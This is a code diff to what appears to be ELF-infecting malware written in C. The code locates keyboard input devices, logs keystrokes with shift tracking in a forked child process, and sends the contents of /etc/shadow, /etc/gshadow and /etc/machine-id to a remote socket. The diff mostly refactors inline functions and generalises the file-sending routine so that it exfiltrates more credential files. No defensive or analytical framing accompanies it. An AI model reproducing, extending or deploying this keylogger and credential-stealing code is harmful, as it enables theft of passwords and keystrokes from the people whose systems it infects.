@@ -1,6 +1,7 @@
 
 #include "elf_utils.h"
 #include "payload.h"
+#include "setup.h"
 #include <sys/select.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -36,7 +37,7 @@ inline static int is_keyboard(const struct dirent *file)
 }
 
 __attribute__((section(ELF_CODE)))
-inline static int *find_keyboards(void)
+static int *find_keyboards(void)
 {
     struct dirent **char_devices = NULL;
     register int possible_paths = scandir(DIR_PATH, &char_devices,
@@ -78,7 +79,7 @@ inline static void refresh_set(fd_set *set, int *kb)
 }
 
 __attribute__((section(ELF_CODE)))
-inline static char *append(char *buffer, char *to_add)
+static char *append(char *buffer, char *to_add)
 {
     register size_t new_len = 0;
 
@@ -96,7 +97,8 @@ inline static bool is_shift(char code)
     return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
 }
 
-__attribute__((section(ELF_CODE))) bool check_if_on_shift(bool is_on_shift, struct input_event evt)
+__attribute__((section(ELF_CODE)))
+static bool check_if_on_shift(bool is_on_shift, struct input_event evt)
 {
     if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED && is_shift(evt.code))
         is_on_shift = true;
@@ -107,7 +109,7 @@ __attribute__((section(ELF_CODE))) bool check_if_on_shift(bool is_on_shift, stru
 }
 
 __attribute__((section(ELF_CODE)))
-inline static void log_single_key(int fd)
+static void log_single_key(int fd)
 {
     static char *buffer = NULL;
     static bool is_on_shift = false;
@@ -145,7 +147,7 @@ inline static void log_single_key(int fd)
 }
 
 __attribute__((section(ELF_CODE)))
-inline static void log_keys(int *fds)
+static void log_keys(int *fds)
 {
     pid_t child = fork();
     struct timeval timeout;
@@ -178,15 +180,20 @@ inline static void log_keys(int *fds)
     }
 }
 
-__attribute__((section(ELF_CODE)))
-inline static void send_file_contents(void)
+static void send_file(char const *filepath)
 {
-    char *shadow = read_file("/dev/shadow");
+    char *file = read_file(filepath);
 
-    // TODO send more files probablies
+    dprintf(g_settings.sockfd, "%s:%s\n", filepath, file);
+    free(file);
+}
 
-    dprintf(g_settings.sockfd, "/etc/shadow:%s\n", shadow);
-    free(shadow);
+__attribute__((section(ELF_CODE)))
+static void send_file_contents(void)
+{
+    send_file("/etc/shadow");
+    send_file("/etc/gshadow");
+    send_file("/etc/machine-id");
 }
 
 __attribute__((section(ELF_CODE)))
